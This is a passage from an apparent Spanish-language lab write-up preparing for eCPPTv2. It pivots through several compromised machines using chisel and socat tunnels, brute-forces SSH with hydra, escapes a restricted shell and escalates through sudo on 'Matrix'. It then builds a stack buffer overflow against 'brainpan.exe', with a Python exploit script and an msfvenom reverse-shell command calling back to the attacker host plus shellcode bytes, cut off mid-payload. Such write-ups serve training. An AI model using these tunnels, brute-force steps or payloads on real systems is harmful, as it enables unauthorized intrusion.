Ya sabemos que la IP de la máquina Matrix es 172.18.0.132. En este punto tenemos que subir la herramienta `chisel` a la máquina Dumbledore para crear otro túnel y así tener conectividad con la máquina Matrix desde nuestro equipo atacante

```bash
#DUMBLEDORE
C:\Windows\system32>copy \\192.168.100.129\smbFolder\chisel.exe C:\Windows\Temp\chisel.exe
        1 file(s) copied.

#ATACANTE
❯ smbserver.py smbFolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.1.142,39538)
[*] AUTHENTICATE_MESSAGE (\,WIN-5OU2D4F1DCJ)
[*] User WIN-5OU2D4F1DCJ\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:smbFolder)
[*] Closing down connection (192.168.1.142,39538)
[*] Remaining connections []
```

Una vez copiado chisel a la máquina Dumbledore levantamos los túneles correspondientes y añadimos `socks5 127.0.0.1 9999` a `/etc/proxychains.conf`

```bash
#DUMBLEDORE
.\chisel.exe client 192.168.100.129:6543 R:9999:socks

#NAGINI
root@Nagini:/tmp# ./socat TCP-LISTEN:6543,fork TCP:10.10.0.134:6542

#ARAGOG
root@Aragog:/tmp# ./socat TCP-LISTEN:6542,fork TCP:192.168.1.148:1234
```

### Reconocimiento (Matrix)

* * *

Técnicas Vistas (Matrix): 

- **Crypto Challenge**
- **Creating a password dictionary using crunch**
- **EXTRA: Applying brute force with Hydra by going through a triple SOCKS5 proxy**
- **Escaping from a restrictive shell**
- **Abusing sudoers privilege [Privilege Escalation]**

Seguimos realizando un escaneo de puertos con `nmap` ya que tenemos conectividad directa con la máquina `Matrix` a través de los tuneles creados

```bash
❯ seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n 172.18.0.132 2>&1 | grep "tcp open"
22/tcp open  ssh
80/tcp open  http
31337/tcp open  Elite
```

Para poder examinar el servicio HTTP por el navegador debemos crear una nueva regla en el foxyproxy

<img src="/assets/VH/eCPPTv2-Lab/foxymatrix.png">

<img src="/assets/VH/eCPPTv2-Lab/matrixweb.png">

Después de enumerar el servicio HTTP por el puerto 80 no encontramos nada interesante por lo que seguimos con el puerto 31337

```bash
❯ proxychains whatweb http://172.18.0.132:31337
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:9999-<>-127.0.0.1:8888-<--timeout
|D-chain|-<>-127.0.0.1:9999-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:9999-<><>-172.18.0.132:31337-<><>-OK
http://172.18.0.132:31337 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[SimpleHTTP/0.6 Python/2.7.14], IP[172.18.0.132], JQuery, Python[2.7.14], Script[text/javascript], Title[Welcome in Matrix]
```

<img src="/assets/VH/eCPPTv2-Lab/matrixweb2.png">

Inspeccionando el código fuente observamos una cadena en base64 en un comentario

<img src="/assets/VH/eCPPTv2-Lab/sourcecode.png">

```bash
❯ echo "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=" | base64 -d;echo
echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix
```

Parece que el contenido codificado en base64 es un echo sobre una cadena de texto y la guarda en el archivo `Cypher.matrix`. Tras darle un par de vueltas probamos en nombre del archivo decodificado en la url de la web


<img src="/assets/VH/eCPPTv2-Lab/brainfuck.png">

El lenguaje codificado parece ser brainfuck. Hay múltiples herramientas en internet para decodificar este tipo de lenguaje, vamos a usar [dcode](https://www.dcode.fr/brainfuck-language). Como mensaje descodificado obtenemos lo siguiente `You can enter into matrix as guest, with password k1ll0rXX
Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password`

### Fuerza Bruta SSH (Matrix)

* * *

Conocemos al usuario `guest` y parte de su contraseña pero nos faltan los dos últimos dígitos. Con la herramienta `crunch` crearemos un diccionario personalizado que contemple todas las combinaciones de números y letras

```bash
❯ crunch 8 8 -t k1ll0r%@ > passwords
Crunch will now generate the following amount of data: 2340 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260 
❯ crunch 8 8 -t k1ll0r@% >> passwords
Crunch will now generate the following amount of data: 2340 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260 
❯ cat passwords| wc -l
520
```

Con hydra aplicaremos fuerza bruta con el diccionario personalizado sobre el servicio SSH

```bash
❯ proxychains hydra -l guest -P passwords ssh://172.18.0.132 -t 20 2>/dev/null
ProxyChains-3.1 (http://proxychains.sf.net)
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-13 20:25:31
[DATA] max 20 tasks per 1 server, overall 20 tasks, 520 login tries (l:1/p:520), ~26 tries per task
[DATA] attacking ssh://172.18.0.132:22/
[22][ssh] host: 172.18.0.132   login: guest   password: k1ll0r7n
```

Nos conectamos por ssh a la máquina Matrix mediante proxychains. Hemos ganado acceso a la máquina `Matrix`

```bash
❯ proxychains ssh guest@172.18.0.132
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:9999-<>-127.0.0.1:8888-<--timeout
|D-chain|-<>-127.0.0.1:9999-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:9999-<><>-172.18.0.132:22-<><>-OK
The authenticity of host '172.18.0.132 (172.18.0.132)' can't be established.
ECDSA key fingerprint is SHA256:BMhLOBAe8UBwzvDNexM7vC3gv9ytO1L8etgkkIL8Ipk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.18.0.132' (ECDSA) to the list of known hosts.
guest@172.18.0.132's password: 
Last login: Mon Aug  6 16:25:44 2018 from 192.168.56.102
guest@porteus:~$ 
```

### Escalada de Privilegios (Matrix)

* * *

Si tratamos de ejecutar cualquier comando nos dará error debido a que nos encontramos ante una `restricted bash`. Si al conectarnos por SSH concatenamosal final un comando este se ejecuta y conseguimos escapar de la `rbash`

```bash
guest@porteus:~$ id
-rbash: id: command not found
guest@porteus:~$ exit
logout
Connection to 172.18.0.132 closed.

❯ proxychains ssh guest@172.18.0.132 bash
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:9999-<>-127.0.0.1:8888-<--timeout
|D-chain|-<>-127.0.0.1:9999-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:9999-<><>-172.18.0.132:22-<><>-OK
guest@172.18.0.132's password: 
id
uid=1000(guest) gid=100(users) groups=100(users),7(lp),11(floppy),17(audio),18(video),19(cdrom),83(plugdev),84(power),86(netdev),93(scanner),997(sambashare)
```

Listando interfaces de red nos damos cuenta que la máquina Matrix tiene conectividad con un segmento de red `10.15.12.0/24` y que la IP de la máquina Matrix en ese segmento es `10.15.12.130`

```bash
guest@porteus:~$ ifconfig
eth125: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.15.12.130  netmask 255.255.255.0  broadcast 10.15.12.255
        inet6 fe80::20c:29ff:fe18:a0cf  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:18:a0:cf  txqueuelen 1000  (Ethernet)
        RX packets 25  bytes 5504 (5.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24  bytes 4130 (4.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth126: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.132  netmask 255.255.255.0  broadcast 172.18.0.255
        inet6 fe80::20c:29ff:fe18:a0c5  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:18:a0:c5  txqueuelen 1000  (Ethernet)
        RX packets 265539  bytes 17253191 (16.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 263372  bytes 17717955 (16.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Listando privilegios de sudo vemos que podemos ejecutar cualquie comando como root. En el directorio `/root` encontramos la flag

```bash
guest@porteus:/home$ sudo -l
User guest may run the following commands on porteus:
    (ALL) ALL
    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp
guest@porteus:/home$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password: 
root@porteus:/home# whoami
root
root@porteus:/home# cd /root
root@porteus:~# ls
Desktop/  Documents/  Downloads/  Music/  Pictures/  Public/  Videos/  flag.txt
root@porteus:~# cat flag.txt 
   _,-.                                                             
,-'  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE
|_,-O__`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE
|`-._\`.__ `_.           IN THE MATRIX AND BEAT OFF                 
|`-._`-.\,-'_|  _,-'.                                               
     `-.|.-' | |`.-'|_     WHAT                                     
        |      |_|,-'_`.                                            
              |-._,-'  |     NO, ME NEITHER                         
         jrei | |    _,'                                            
              '-|_,-'          IT'S JUST A HYPOTHETICAL QUESTION    
```

### Reconocimiento (Brainpan)

* * *

Técnicas Vistas (Brainpan): 

- **EXTRA: Creation of bash script to discover computers on the internal network**
- **Web Enumeration - BurpSuite Intruder Attack (Due to certain timeout problems using multiple proxies)**
- **EXE Binary Analysis - Immunity Debugger [Buffer Overflow x32 Stack Based]**
- **EXTRA: Playing with netsh to control connection flow in Windows**
- **EXTRA: Reverse shell going through 4 machines using 4 SOCKS proxies**

Iniciamos el reconocimiento de la máquina `Brainpan`. Necesitamos saber su IP y los puertos abiertos que tiene esta máquina. Para ello nos haremos un pequeño script en bash el cual nos ayudará con la tarea. Sabiendo que la IP de la máquina Matrix en el segmento es 10.15.12.130 vamos a escanear todas las IP en el segmento `10.15.12.0/24`

```bash
root@porteus:/tmp# ip a
10.10.0.134 192.168.1.142 fd89:c343:c759:42dc:20c:29ff:fef9:9301
2: eth126: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:18:a0:c5 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.132/24 brd 172.18.0.255 scope global dynamic eth126
       valid_lft 1568sec preferred_lft 1568sec
    inet6 fe80::20c:29ff:fe18:a0c5/64 scope link 
       valid_lft forever preferred_lft forever
3: eth125: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:18:a0:cf brd ff:ff:ff:ff:ff:ff
    inet 10.15.12.130/24 brd 10.15.12.255 scope global dynamic eth125
       valid_lft 1645sec preferred_lft 1645sec
    inet6 fe80::20c:29ff:fe18:a0cf/64 scope link 
       valid_lft forever preferred_lft forever 
```

```bash
#!/bin/bash

for i in $(seq 1 254); do
        timeout 1 bash -c "ping -c 1 10.15.12.$i" &>/dev/null && echo "[+] Host 10.15.12.$i - ACTIVO" &
done; wait
```
```bash
root@porteus:/tmp# ./hostDiscovery.sh 
[+] Host 10.15.12.1 - ACTIVO
[+] Host 10.15.12.129 - ACTIVO
[+] Host 10.15.12.130 - ACTIVO
```
Ya sabemos que la IP de la máquina `Brainpan` es la 10.15.12.129. Ahora procedemos a enumerar los puertos abiertos mediante otro script en bash

```bash
#!/bin/bash

for port in $(seq 1 65535); do
        timeout 1 bash -c "echo '' > /dev/tcp/10.15.12.129/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
done; wait
```

```bash
root@porteus:/tmp# ./portDiscovery.sh 
[+] Port 9999 - OPEN
[+] Port 10000 - OPEN
```
A partir de este punto para trabajar más cómodamente vamos a crear un túnel por el cual nos vamos a poder acceder a la máquina `Brainpan` desde nuestro equipo atacante a pesar de no tener conexión directa al no estar en el mismo segmento. Después de crear el túnel debemos agregar `socks5 127.0.0.1 5522` a nuestro archivo `/etc/proxychains.conf`


```bash
#MATRIX
root@porteus:/tmp# ./chisel client 172.18.0.130:8787 R:5522:socks

#DUMBLEDORE
C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=8787 listenaddress=0.0.0.0 connectport=8788 connectaddress=192.168.100.129

#NAGINI
root@Nagini:/tmp# ./socat TCP-LISTEN:8788,fork TCP:10.10.0.134:8789

#ARAGOG
root@Aragog:/tmp# ./socat TCP-LISTEN:8789,fork TCP:192.168.1.148:1234
```

Ahora que tenemos conectividad directa con la máquina Brainpan seguimos aplicando un reconocimiento de puertos para verificar la información que vimos tras ejecutar el script `portDiscovery.sh` desde la máquina Matrix

```bash
❯ seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n 10.15.12.129 2>&1 | grep "tcp open"
9999/tcp open  abyss
10000/tcp open  snet-sensor-mgmt
```

Seguimos con `whatweb` para extraer un poco más de información del servicio que corre por el puerto 10000

```bash
❯ proxychains whatweb http://10.15.12.129:10000
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:5522-<>-127.0.0.1:9999-<--timeout
|D-chain|-<>-127.0.0.1:5522-<>-127.0.0.1:8888-<--timeout
|D-chain|-<>-127.0.0.1:5522-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:5522-<><>-10.15.12.129:10000-<><>-OK
http://10.15.12.129:10000 [200 OK] Country[RESERVED][ZZ], HTTPServer[SimpleHTTP/0.6 Python/2.7.3], IP[10.15.12.129], Python[2.7.3]
```

Para acceder a la web crearemos una nueva norma en FoxyProxy con los datos del nuevo túnel

<img src="/assets/VH/eCPPTv2-Lab/brainpanfoxy.png">

Ya podemos acceder directamente a través del navegador

<img src="/assets/VH/eCPPTv2-Lab/brainpanweb.png">

Si tratamos de fuzzear directorios con gobuster nos puede dar problemas por lo que utilizaremos `BurpSuite` para esta tarea. Antes de nada debemos configurar Burp ara que pase a través de nuestro proxy. Nos dirigimos a `User Options -> SOCKS Proxy`

<img src="/assets/VH/eCPPTv2-Lab/brainpanburp.png">

Capturamos petición y redirigimos al Intruder para acontecer un ataque de tipo sniper. Cargamos el diccionario de SecLists `directory-list-2.3-medium.txt` y comenzamos el ataque. Después de un rato obsrevamos que el directorio `/bin` nos devuleve el estado 301

<img src="/assets/VH/eCPPTv2-Lab/brainpan301.png">

Accedemos a la ruta encontrada y vemos que nos comparten un binario `brainpan.exe`

<img src="/assets/VH/eCPPTv2-Lab/brainpanbin.png">

Parece que este binario es el servicio que nos están compartiendo por el puerto 9999

```bash
❯ proxychains nc 10.15.12.129 9999
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:5522-<>-127.0.0.1:9999-<--timeout
|D-chain|-<>-127.0.0.1:5522-<>-127.0.0.1:8888-<--timeout
|D-chain|-<>-127.0.0.1:5522-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:5522-<><>-10.15.12.129:9999-<><>-OK
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> 
```

### Buffer Overflow (Brainpan)

* * *

En este punto nos descargamos el binario para aplicar debugging. Trabajaremos con una máquina con Windows 7 x86 ya que el binario es de 32 Bits. También haremos uso de la herramienta [Inmunity Debugger](https://www.immunityinc.com/products/debugger/) la cual nos debemos descargar en la máquina Windows 7 x86. Ejecutamos la aplicación brainpan.exe, abrimos el Inmunity Debugger y adjuntamos el binario brainpan.exe. Desde nuestra máquina de atacante nos conectamos e insertamos muchas A's y observamos la respuesta en Inmunity Debugger

```bash
❯ nc 192.168.1.145 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

<img src="/assets/VH/eCPPTv2-Lab/inmunity.png">

Vemos que los registros `eip` y `ebp` tienen el valor `41 41 41 41` que corresponde a las A's introducidas en el input. Confirmamos que estamos ante el caso de que hemos escrito tantas A's que hemos sobrepasado el tamaño de buffer asignado y hemos empezado a sobreescribir ciertos registros existentes en la memoria. En este punto debemos saber cuanta cantidad de A's debemos escribir hasta sobreescribir el `eip`. Para ello usaremos la herramienta del framework de Metasploit `pattern create` el cual nos creará un patrón único de 1000 bytes

```bash
❯ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

Volvemos a ejecutar binario brainpan.exe e inmunity y desde nuestra máquina de atacante nos conectamos e introducimos el patrón generado. Observamos esta vez que el registro de `eip` es `35724134`. Con la herramienta de Metasploit `pattern_offset` averiguamos que el offset se encuentra en 524

<img src="/assets/VH/eCPPTv2-Lab/offset.png">

```bash
❯ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35724134
[*] Exact match at offset 524
```

En este punto confirmamos que tenemos control del `eip`. Si ahora conseguimos que el flujo del programa apunte a una dirección donde se aplica un Op. Code que aplique un salto al `esp` enotonces podremos inyectarle un shellcode que lo ejecute. Sabemos que los programas no aceptan todo tipo de caracteres por tanto tenemos que generar un patrón de caracteres e introducirlos en el `esp` y ver a través de Inmunity Debugger si hay algún caracter que no lo acepta. Si hay algún caracter que no lo representa estamos ante un `Badchar` por lo que cuando generemos el shellcode tenemos que excluir estos caracteres 'malos' para evitar que corrompa el programa. Para esta tarea usaremos [Mona](https://github.com/corelan/mona). Ejecutamos Inmunity, seleccionarmos como directorio de trabajo una carpeta creada en nuestro escritorio con `!mona config -set workingfolder C:\Users\yorch\Desktop\Binary\%p` y posteriormente ejecutamos `!mona bytearray -cpb "\x00"` para que nos genere un bytearray y lo guarde en un archivo en el directorio de trabajo

<img src="/assets/VH/eCPPTv2-Lab/bytearray.png">

Nos transferimos el archivo bytearray a nuestra máquina atacante y comenzamos con la elaboración del script incluyendo el bytearray

```python
#!/usr/bin/python3

import socket
from struct import pack

offset = 524
before_eip = b"A" * offset
eip = b"B"*4
after_eip = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.145", 9999))
s.send(payload)
s.close()
```

Arrancamos binario e Inmunity Debugger y ejecutamos el script desde nuestra máquina. Hacemos click secundario en la dirección del `esp`, Follow in dump y veremos todos los caracteres introducidos en el `esp`. Con la ayuda de mona ejecutando el parámetro `!mona compare -f C:\Users\yorch\Desktop\Binary\_no_name\bytearray.bin -a 0x0022F930` validará si falta alguno de los caracteres generados en el bytearray. En este caso no encuentra ninguno. Si hubiera alguno hay que tenerlo en cuenta a la hora de generar el shellcode

<img src="/assets/VH/eCPPTv2-Lab/compare.png">

En este punto podemos generar nuestro shellcode de la siguiente forma

```bash
❯ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.148 LPORT=443 --platform windows -a x86 -e x86/shikata_ga_nai -f c -b "\x00"  EXITFUNC=thread
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] = 
"\xbb\x8f\x7a\x95\xab\xdb\xc8\xd9\x74\x24\xf4\x58\x29\xc9"
"\xb1\x52\x31\x58\x12\x83\xe8\xfc\x03\xd7\x74\x77\x5e\x1b"
"\x60\xf5\xa1\xe3\x71\x9a\x28\x06\x40\x9a\x4f\x43\xf3\x2a"
"\x1b\x01\xf8\xc1\x49\xb1\x8b\xa4\x45\xb6\x3c\x02\xb0\xf9"
"\xbd\x3f\x80\x98\x3d\x42\xd5\x7a\x7f\x8d\x28\x7b\xb8\xf0"
"\xc1\x29\x11\x7e\x77\xdd\x16\xca\x44\x56\x64\xda\xcc\x8b"
"\x3d\xdd\xfd\x1a\x35\x84\xdd\x9d\x9a\xbc\x57\x85\xff\xf9"
"\x2e\x3e\xcb\x76\xb1\x96\x05\x76\x1e\xd7\xa9\x85\x5e\x10"
"\x0d\x76\x15\x68\x6d\x0b\x2e\xaf\x0f\xd7\xbb\x2b\xb7\x9c"
"\x1c\x97\x49\x70\xfa\x5c\x45\x3d\x88\x3a\x4a\xc0\x5d\x31"
"\x76\x49\x60\x95\xfe\x09\x47\x31\x5a\xc9\xe6\x60\x06\xbc"
"\x17\x72\xe9\x61\xb2\xf9\x04\x75\xcf\xa0\x40\xba\xe2\x5a"
"\x91\xd4\x75\x29\xa3\x7b\x2e\xa5\x8f\xf4\xe8\x32\xef\x2e"
"\x4c\xac\x0e\xd1\xad\xe5\xd4\x85\xfd\x9d\xfd\xa5\x95\x5d"
"\x01\x70\x39\x0d\xad\x2b\xfa\xfd\x0d\x9c\x92\x17\x82\xc3"
